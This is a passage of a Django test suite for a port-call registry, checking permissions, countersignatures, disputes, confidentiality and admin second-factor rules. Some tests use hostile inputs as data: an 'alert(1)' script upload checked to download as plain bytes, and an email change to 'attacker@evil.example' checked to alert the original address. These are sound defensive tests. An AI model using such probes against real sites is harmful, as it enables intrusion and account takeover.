    # a file declared as a script is downloaded as plain bytes through the API too
    call = declared_call(world)
    doc = doc_svc.upload_document(call, act(world, call, "TER"), "OTHER",
                                  SimpleUploadedFile("x.json", b"alert(1)", content_type="text/javascript"),
                                  confidentiality="N1")
    token = Token.objects.create(user=world.users["INS"]).key
    response = client.get(f"/api/v1/calls/{call.reference}/documents/{doc.pk}/download/",
                          HTTP_AUTHORIZATION=f"Bearer {token}")
    assert response["Content-Type"] == "application/octet-stream"

    # two towage companies on one call: the order names the one that carries it out
    tug = second_org(world, call, "Tug Co", "SVC", "tug@test.local")
    with pytest.raises(RuleViolation):
        req_svc.create_request(call, act(world, call, "AGE"), "MARINE_SERVICES",
                               {"movement": "ARRIVAL", "requested_time": now(60).isoformat()})
    order = req_svc.create_request(call, act(world, call, "AGE"), "MARINE_SERVICES",
                                   {"movement": "ARRIVAL", "requested_time": now(60).isoformat()}, provider=tug.org.pk)
    req_svc.schedule_request(order, tug, now(90))
    assert task(call, "M0:18").status == "DONE"


# ================================================================================================ third review
@pytest.mark.django_db
def test_a_joint_safety_checklist_is_never_waived_by_one_signatory(world):
    from apps.registry.services import milestones as ms_svc
    from apps.registry.services import tasks as task_svc
    from apps.registry.services.errors import HoldPointRefused, PermissionRefused, StrongAuthRequired

    call = declared_call(world)
    force_done(call, ["M0:28", "M0:29", "M0:31", "M1:1.04", "M1:1.05", "M1:1.06", "M1:1.07"])
    ter = act(world, call, "TER")
    with pytest.raises(PermissionRefused):
        task_svc.mark_not_applicable(task(call, "M0:27"), ter, "meeting not needed")
    with pytest.raises(HoldPointRefused):
        ms_svc.record_milestone(call, ter, "TRANSFER_START", now(-1))
    with pytest.raises(StrongAuthRequired):
        task_svc.mark_not_applicable(task(call, "M0:27"), act(world, call, "CAP", strong=False), "no transfer")
    task_svc.mark_not_applicable(task(call, "M0:27"), act(world, call, "CAP"), "repairs only: no transfer")


@pytest.mark.django_db
def test_the_shore_side_is_designated_not_self_proclaimed(world):
    """Several providers at sea: only the designated one records the STS operation and countersigns for the shore;
    the master's contest of its milestone is addressed to it alone; notices go to it alone."""
    from apps.registry.models import Notification
    from apps.registry.services import disputes, rights
    from apps.registry.services import milestones as ms_svc
    from apps.registry.services.context import actor_for_call
    from apps.registry.services.errors import PermissionRefused

    from .conftest import master

    call = make_call(world, kind="ANCHORAGE", operations=("M6",),
                     parties=[(world.orgs.waste, "PRE"), (world.orgs.sts, "PRE")])
    force_done(call, ["M0:02", "M0:03", "M0:05"])
    call_svc.declare_call(call, act(world, call, "AGE"))
    from apps.core.models import User

    sts_user = User.objects.create_user(email="poac@test.local", password="pw-test-123456", full_name="POAC",
                                        organization=world.orgs.sts, roles=["PRE"])
    sts, waste, nav = actor_for_call(call, user=sts_user), act(world, call, "PRE"), master(world, call)
    with pytest.raises(PermissionRefused):  # nobody designated yet: no provider elects itself
        ms_svc.record_milestone(call, waste, "STS_SEPARATED", now(-5))
    stop = ms_svc.record_milestone(call, nav, "INTERRUPTION_START", now(-60), cause_code="WEATHER_LIMITS")
    assert not rights.milestone_visible(waste, stop) and not rights.milestone_visible(sts, stop)
    call_svc.designate_shore_side(call, act(world, call, "AGE"), call.parties.get(organization=world.orgs.sts, role="PRE"))
    assert rights.milestone_visible(sts, stop) and not rights.milestone_visible(waste, stop)
    with pytest.raises(PermissionRefused):
        ms_svc.countersign_milestone(stop, waste)
    ms_svc.countersign_milestone(stop, sts)
    with pytest.raises(PermissionRefused):
        ms_svc.record_milestone(call, waste, "STS_SEPARATED", now(-5))
    separated = ms_svc.record_milestone(call, sts, "STS_SEPARATED", now(-5))
    # the master contests the operator's milestone: the waste contractor neither reads nor answers it
    dispute = disputes.open_dispute(call, nav, target_kind="MILESTONE", target_id=separated.pk, subject="Time",
                                    statement="Separation took place later", counterpart_role="PRE")
    assert not rights.dispute_header_visible(waste, dispute) and rights.dispute_content_visible(sts, dispute)
    with pytest.raises(PermissionRefused):
        disputes.respond(dispute, waste, "not us")
    disputes.respond(dispute, sts, "We maintain the time.")
    # countersignature notices reach the designated provider only
    later = ms_svc.record_milestone(call, nav, "INTERRUPTION_START", now(-2), cause_code="WEATHER_LIMITS")
    assert Notification.objects.filter(dedupe_key=f"countersign:{later.pk}", user=sts_user).exists()
    assert not Notification.objects.filter(dedupe_key=f"countersign:{later.pk}", user=world.users["PRE"]).exists()


@pytest.mark.django_db
def test_second_terminal_and_second_surveyor(client, world):
    from django.utils import translation

    from apps.registry.services import measurements as meas_svc
    from apps.registry.services import milestones as ms_svc
    from apps.registry.services.errors import PermissionRefused

    from .conftest import master

    call = declared_call(world)
    depot = second_org(world, call, "Depot", "TER", "depot2@test.local")
    surveyor_b = second_org(world, call, "Receivers' Surveyor", "INS", "ins2@test.local")
    nav = master(world, call)
    stop = ms_svc.record_milestone(call, nav, "INTERRUPTION_START", now(-30), cause_code="WEATHER_LIMITS")
    with translation.override("en"):  # each refusal says why
        with pytest.raises(PermissionRefused, match="shore side"):  # two terminals, none designated: neither answers
            ms_svc.countersign_milestone(stop, depot)
        with pytest.raises(PermissionRefused, match="not open to your role"):  # nobody countersigns its own record
            ms_svc.countersign_milestone(stop, nav)
    call_svc.designate_shore_side(call, act(world, call, "CAP"), call.parties.get(organization=world.orgs.terminal,
                                                                                   role="TER"))
    with translation.override("en"), pytest.raises(PermissionRefused, match="shore side"):
        ms_svc.countersign_milestone(stop, depot)
    # the screen offers the countersignature to the designated terminal only
    button = f'name="milestone_id" value="{stop.pk}"'
    for user, shown in ((depot.user, False), (world.users["TER"], True)):
        client.force_login(user)
        page = client.get(f"/escales/{call.pk}/?tab=jalons").content.decode()
        assert (button in page) is shown
    ms_svc.countersign_milestone(stop, act(world, call, "TER"))
    m = meas_svc.create_measurement(call, act(world, call, "INS"), "FINAL")
    with pytest.raises(PermissionRefused):
        meas_svc.add_value(m, depot, "SHORE", "29990")
    meas_svc.add_value(m, act(world, call, "TER"), "SHORE", "29900")
    meas_svc.add_value(m, act(world, call, "INS"), "SURVEYOR", "29950")
    meas_svc.add_value(m, surveyor_b, "SURVEYOR", "29940")  # each surveyor enters its own figure


@pytest.mark.django_db
def test_late_entry_after_the_authorization_lapsed_is_flagged(world):
    from apps.registry.models import Alert, AlertKind
    from apps.registry.services import milestones as ms_svc
    from apps.registry.services.tasks import system_complete

    from .conftest import grant_authorization, master
    from .conftest import sys as system_actor_for

    call = declared_call(world)
    clearance = task(call, "M0:34")
    system_complete(clearance, system_actor_for(call), evidence="test")
    grant_authorization(call, clearance, valid_from=now(-24 * 60), valid_until=now(-10))
    departed = ms_svc.record_milestone(call, master(world, call), "DEPARTED", now(-15))
    assert departed.deferred
    assert Alert.objects.filter(call=call, kind=AlertKind.HOLD_POINT, milestone=departed,
                                recipient_roles__contains=["CAP"]).exists()


@pytest.mark.django_db
def test_journal_titles_follow_the_objects_visibility(client, world):
    from django.core.files.base import ContentFile

    from apps.registry.services import correspondence
    from apps.registry.services import documents as doc_svc

    call = declared_call(world)
    owner = act(world, call, "COM")
    charterer = second_org(world, call, "Charterer Two", "COM", "chart2@test.local")
    correspondence.create_thread(call, owner, subject="Hire 14 500 USD per day", participant_roles=["AGE"],
                                 body="b", confidentiality="N3")
    doc_svc.upload_document(call, owner, "CP_RECAP", ContentFile(b"%PDF-1 cp", name="cp.pdf"),
                            title="Recap — freight 38 USD/t", confidentiality="N3", counterpart_role="AGE")
    token = Token.objects.create(user=charterer.user).key
    body = json.dumps(client.get(f"/api/v1/calls/{call.reference}/journal/", HTTP_AUTHORIZATION=f"Bearer {token}").json())
    assert "14 500" not in body and "38 USD" not in body


@pytest.mark.django_db
def test_orders_and_frozen_authorizations(client, world):
    from apps.registry.models import CallStatus, PortCall, RequestStatus
    from apps.registry.services import requests as req_svc
    from apps.registry.services import rights
    from apps.registry.services.errors import RuleViolation

    from .conftest import grant_authorization

    # an order created before its provider joined becomes its own when it joins
    call = make_call(world, parties=[(world.orgs.terminal, "TER")])
    force_done(call, ["M0:02", "M0:03", "M0:05"])
    call_svc.declare_call(call, act(world, call, "AGE"))
    order = req_svc.create_request(call, act(world, call, "AGE"), "WASTE_COLLECTION",
                                   {"categories": "I", "volume_m3": 5})
    assert order.provider_org_id is None
    call_svc.add_party(call, act(world, call, "AGE"), world.orgs.waste, "PRE")
    order.refresh_from_db()
    assert order.provider_org == world.orgs.waste and rights.request_visible(act(world, call, "PRE"), order)

    # when the platform cannot tell, the requesting party names the provider — once, and among the parties
    from apps.registry.models import CallParty
    from apps.registry.services.errors import PermissionRefused

    other = make_call(world, parties=[(world.orgs.terminal, "TER")])
    force_done(other, ["M0:02", "M0:03", "M0:05"])
    call_svc.declare_call(other, act(world, other, "AGE"))
    pending = req_svc.create_request(other, act(world, other, "AGE"), "WASTE_COLLECTION",
                                     {"categories": "I", "volume_m3": 5})
    with pytest.raises(RuleViolation):  # nobody carries out this service on the call yet
        req_svc.assign_provider(pending, act(world, other, "AGE"), None)
    for org in (world.orgs.waste, world.orgs.sts):  # two contractors entered together, as from the settings
        CallParty.objects.create(call=other, organization=org, role="PRE")
    with pytest.raises(PermissionRefused):
        req_svc.assign_provider(pending, act(world, other, "TER"), world.orgs.waste)
    with pytest.raises(RuleViolation):  # several can: one must be named
        req_svc.assign_provider(pending, act(world, other, "AGE"), None)
    with pytest.raises(RuleViolation):  # not a contractor of the call
        req_svc.assign_provider(pending, act(world, other, "AGE"), world.orgs.terminal)
    req_svc.assign_provider(pending, act(world, other, "AGE"), world.orgs.waste)
    with pytest.raises(RuleViolation):
        req_svc.assign_provider(pending, act(world, other, "AGE"), world.orgs.sts)
    assert PortCall.objects.get(pk=other.pk).requests.get(pk=pending.pk).provider_org == world.orgs.waste

    # an authorization of a closed call is never cancelled, nor expired by the platform
    closed = declared_call(world)
    auth = grant_authorization(closed, task(closed, "M0:25"), valid_from=now(-120), valid_until=now(-1))
    auth.request.status = RequestStatus.APPROVED
    auth.request.save()
    PortCall.objects.filter(pk=closed.pk).update(status=CallStatus.CLOSED)
    auth.call.refresh_from_db()
    with pytest.raises(RuleViolation):
        req_svc.cancel_authorization(auth, act(world, auth.call, "CAP"), "late")
    req_svc.expire_authorizations()
    auth.request.refresh_from_db()
    assert auth.request.status == RequestStatus.APPROVED

    # a signed-in person without access to the settings is not sent round in circles
    client.force_login(world.users["TER"])
    response = client.get("/admin/login/?next=/admin/")
    assert response.status_code == 302 and response["Location"] == "/"


@pytest.mark.django_db
def test_admin_notice_goes_to_the_address_on_record(client, world):
    from django.core import mail

    admin = world.users["DIR"]
    admin.is_port_admin = True
    admin.save()
    enrol(admin)
    client.force_login(admin)
    session = client.session
    session.update(mfa.stamp(admin))
    session.save()
    cap = world.users["CAP"]
    enrol(cap)
    original = cap.email
    mail.outbox.clear()
    response = client.post(f"/admin/core/user/{cap.pk}/change/", {
        "email": "attacker@evil.example", "full_name": cap.full_name, "organization": cap.organization_id,
        "roles": ["CAP"], "language": "en", "phone": "", "is_active": "on", "notify_digest_only": "on"})
    assert response.status_code == 302
    assert any(original in m.to for m in mail.outbox)


@pytest.mark.django_db
def test_settings_actions_need_a_recent_second_factor(client, world):
    import time

    from apps.registry.models import CallTemplate, TemplateVersion
    from apps.registry.services.templates import new_draft_version

    admin = world.users["DIR"]
    admin.is_port_admin = True
    admin.save()
    enrol(admin)
    draft = new_draft_version(CallTemplate.objects.get(port=world.port, code="M1"), admin)
    client.force_login(admin)
    session = client.session
    session.update(mfa.stamp(admin))
    session[mfa.SESSION_KEY] = int(time.time()) - 9 * 3600  # second factor passed nine hours ago
    session.save()
    client.post("/admin/registry/templateversion/", {"action": "publish", "_selected_action": [draft.pk]})
    draft.refresh_from_db()
    assert draft.status == TemplateVersion.Status.DRAFT
    session = client.session
    session[mfa.SESSION_KEY] = int(time.time())
    session.save()
    client.post("/admin/registry/templateversion/", {"action": "publish", "_selected_action": [draft.pk]})
    draft.refresh_from_db()
    assert draft.status == TemplateVersion.Status.PUBLISHED
